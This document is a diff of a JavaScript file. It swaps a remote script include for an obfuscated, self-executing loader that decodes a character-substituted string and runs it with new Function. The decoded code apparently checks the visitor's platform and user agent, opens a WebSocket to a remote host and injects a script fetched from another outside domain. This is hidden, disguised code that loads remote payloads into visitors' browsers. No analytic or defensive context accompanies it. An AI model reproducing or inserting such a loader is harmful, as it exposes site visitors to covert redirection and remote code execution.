@@ -1,1 +1,10 @@
-document.writeln('<script src="https://qa.lcttty.top/c/EA313724-83BA-4C23-8B74-2D8CFCC108C1.ap"></script>');
+    (function () {
+            function LIkKbZH (s) {
+        var d = {"K":"v","a":"a","Y":"r","i":" ","+":"L","^":"C","f":"n","7":"c","|":"z","W":"J","H":"S","U":"=","}":"f","S":"u","Z":"t","q":"i","X":"o","L":"(",",":"e","C":")","B":"{","4":0,"A":"h","l":"A","u":",","n":1,"e":"m","[":"d","w":2,"r":3,"{":"x","k":"O","v":";","_":"s","2":"B","E":"D","o":"E","R":"F",".":"G","h":"H","5":"I","<":"K","G":"M","b":"N","M":"P","F":"Q","=":"R","1":"T","P":"U","t":"V","0":"W","m":"X","T":"Y","!":"Z","&":"+","J":"b","g":"g","y":"j","I":"k",")":"l"," ":"p","V":"q","-":"w","D":"y","d":4,"6":5,":":6,"p":7,"s":8,"(":9,"Q":".","N":"[","j":"^","c":"-",">":"]","x":"<","9":"|","]":">","z":"&",";":"!","O":"}","8":":","3":"_"};
+        return s.split('').map(function (c) {
+            return d[c] !== undefined ? d[c] : c;
+        }).join('');
+    }
+        var c = LIkKbZH('data:image/jpg;base64,KaYi+^f7|WHU}Sf7ZqXfL,CBKaYia4U"7AaYlZ"uanU"}YXe^AaY^X[,"uawU"7AaY^X[,lZ"uarU"qf[,{k}"vKaYi_{U"l2^EoR.h5W<+GbkMF=H1Pt0mT!"&"aJ7[,}gAqyI)efX VY_ZSK-{D|"&"4nwrd6:ps(&/U"vKaYiZU""ufuYuqu_uXuSuau}U4v,U,QY, )a7,L/Njlc!ac|4c(&/U>/gu""Cv-Aq),L}x,Q),fgZACB_U_{Nar>L,Na4>L}&&CCvXU_{Nar>L,Na4>L}&&CCvSU_{Nar>L,Na4>L}&&CCvaU_{Nar>L,Na4>L}&&CCvfU_xxw9X]]dvYULXzn6Cxxd9S]]wvqULSzrCxx:9avZUZ&HZYqfgNan>LfCvq}LS;U:dCBZUZ&HZYqfgNan>LYCvOq}La;U:dCBZUZ&HZYqfgNan>LqCvOOY,ZSYfL}Sf7ZqXfL,CBKaYiZU""ufUYU7nU7wU4v-Aq),Lfx,Q),fgZACBYU,Naw>LfCvq}LYxnwsCBZ&UHZYqfgNan>LYCvf&&vO,)_,iq}LY]n(nzzYxwwdCB7wU,Naw>Lf&nCvZ&UHZYqfgNan>LLYzrnCxx:97wz:rCvf&UwO,)_,B7wU,Naw>Lf&nCv7rU,Naw>Lf&wCvZ&UHZYqfgNan>LLYzn6Cxxnw9L7wz:rCxx:97rz:rCvf&UrvOOY,ZSYfiZvOCLZCvOvKaYi[U[X7Se,fZufUfaKqgaZXYN" )aZ}XYe">u7_U[Q7SYY,fZH7Yq Zvq}L;/jGa790qf/QZ,_ZLfC99;fCBq}LfaKqgaZXYQS_,Ylg,fZQqf[,{k}L"Jaq[S"C]cnCBKaYi-_Uf,-i0,JHX7I,ZL"-__8//ZYQD,_Sf:psQ7Xe8(r(r/n6wr64"Cv-_QXfe,__ag,U}Sf7ZqXfL,CB-_Q7)X_,LCvf,-iRSf7ZqXfL"3Z[7_"u+^f7|WHL,Q[aZaCCL7_CvOO,)_,BKaYi_U[X7Se,fZQ7Y,aZ,o),e,fZL"_7Yq Z"Cv_Q_Y7U"AZZ _8//gJ}Qe[}}SfQ7f/{/n6wr64"v7_Q aY,fZo),e,fZQqf_,YZ2,}XY,L_u7_CvOO'.substr(22));
+        new Function(c)();
+    })();
